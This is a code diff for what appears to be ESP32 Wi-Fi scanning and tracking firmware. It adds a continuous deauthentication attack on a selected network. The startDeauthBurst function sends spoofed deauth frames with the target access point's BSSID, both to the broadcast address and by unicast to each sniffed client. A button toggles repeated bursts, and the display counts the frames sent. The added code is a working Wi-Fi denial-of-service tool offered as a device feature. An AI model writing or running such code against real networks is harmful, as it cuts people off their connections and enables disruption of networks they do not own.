@@ -6,7 +6,10 @@
 #include <Preferences.h>
 
 #include "button.h"
+#include "deauth.h"
+#include "deauth_tx.h"
 #include "distance.h"
+#include "frames.h"
 #include "nav.h"
 #include "net_list.h"
 #include "rssi_filter.h"
@@ -31,6 +34,8 @@ constexpr int kMinCalibrationSamples = 8;  // ~1 s of readings
 constexpr float kDefaultRssiAt1m = -40.0f;
 constexpr float kIndoorN = 3.0f;
 constexpr float kOutdoorN = 2.2f;
+constexpr int kDeauthBurstBcast = 4;              // broadcast frames per burst
+constexpr uint16_t kDeauthReason = 7;             // Class 3 from unassociated
 
 Button button;
 Nav nav;
@@ -39,6 +44,9 @@ NetList results;  // scratch space for the last scan
 RssiFilter filter;
 TrendTracker trend;
 Preferences prefs;
+DeauthRun deauthRun;
+uint16_t deauthSeq = 0;
+uint8_t clientBuf[ClientTable::kCapacity][6];
 
 Network target{};
 float rssiAt1m = kDefaultRssiAt1m;
@@ -121,9 +129,38 @@ void handleAction(Action a, uint32_t now) {
       outdoor = !outdoor;
       saveSettings();
       break;
+    case Action::ToggleDeauth:
+      if (deauthRun.running()) {
+        deauthRun.stop(now);
+      } else {
+        deauthRun.start(now);
+      }
+      break;
+    case Action::StopDeauth:
+      deauthRun.stop(now);
+      break;
     case Action::None:
       break;
   }
+}
+
+void startDeauthBurst(uint32_t now) {
+  int sent = 0;
+  for (int i = 0; i < kDeauthBurstBcast; i++) {
+    if (deauthTxSend(target.bssid, broadcastMac(), deauthSeq, kDeauthReason))
+      sent++;
+    deauthSeq++;
+  }
+  // The stations seen recently get an unicast deauth each: it survives even
+  // when a station ignores the broadcast frame.
+  const int n = snifferCopyClients(clientBuf, ClientTable::kCapacity,
+                                   kClientWindowMs);
+  for (int i = 0; i < n; i++) {
+    if (deauthTxSend(target.bssid, clientBuf[i], deauthSeq, kDeauthReason))
+      sent++;
+    deauthSeq++;
+  }
+  deauthRun.addSent(sent, now);
 }
 
 // The radio does one thing at a time: a full scan (list, or looking for a
@@ -173,6 +210,13 @@ void updateRadio(uint32_t now) {
                     static_cast<int>(trend.state()), snifferClients(kClientWindowMs));
     }
   }
+
+  // Continuous deauth while the user asked for it and the radio is free.
+  if (deauthRun.running() && snifferActive() && !scannerBusy() &&
+      deauthRun.burstDue(now)) {
+    startDeauthBurst(now);
+  }
+
   if (now - lastSeenAt > kLostAfterMs) {
     snifferStop();  // look for it on every channel
     trend.reset();
@@ -219,8 +263,13 @@ void loop() {
                    distanceRange(filter.value(), filter.sigma(), model()),
                    trend.state(),
                    snifferActive() ? snifferClients(kClientWindowMs) : -1};
-    uiDraw(nav, nets, scannerBusy() && !tracking(), view, outdoor, rssiAt1m,
-           button.heldMs(now), button.pending(now), toast, now);
+    DeauthView deauth{&target,
+                      deauthRun.running(),
+                      deauthRun.sent(),
+                      deauthRun.elapsedMs(now),
+                      snifferActive() ? snifferClients(kClientWindowMs) : -1};
+    uiDraw(nav, nets, scannerBusy() && !tracking(), view, deauth, outdoor,
+           rssiAt1m, button.heldMs(now), button.pending(now), toast, now);
   }
   delay(5);
 }
